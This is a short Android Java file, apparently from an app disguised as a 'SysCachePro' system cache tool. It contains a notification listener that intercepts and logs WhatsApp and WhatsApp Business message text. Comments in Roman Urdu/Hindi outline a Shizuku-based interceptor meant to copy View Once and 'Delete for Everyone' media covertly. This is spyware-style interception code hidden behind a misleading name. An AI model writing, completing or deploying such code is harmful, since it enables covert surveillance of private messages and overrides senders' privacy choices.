package com.syscache.pro;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationService extends NotificationListenerService {
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        
        // Sirf WhatsApp (Normal aur Business) ki notifications ko pakarna hai
        if (packageName.equals("com.whatsapp") || packageName.equals("com.whatsapp.w4b")) {
            CharSequence tickerText = sbn.getNotification().tickerText;
            
            if (tickerText != null) {
                String message = tickerText.toString();
                // Yeh text messages aur notification details ko catch karta hai
                Log.d("SysCachePro", "WhatsApp Data Intercepted: " + message);
                
                // Yahan se Shizuku interceptor trigger hoga jo hidden cache se 
                // View Once aur deleted media files utha kar 128GB internal storage mein copy karega
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Agar sender message ya picture "Delete for Everyone" kar de
        // Humara system usay pehle hi background mein save kar chuka hoga
    }
}
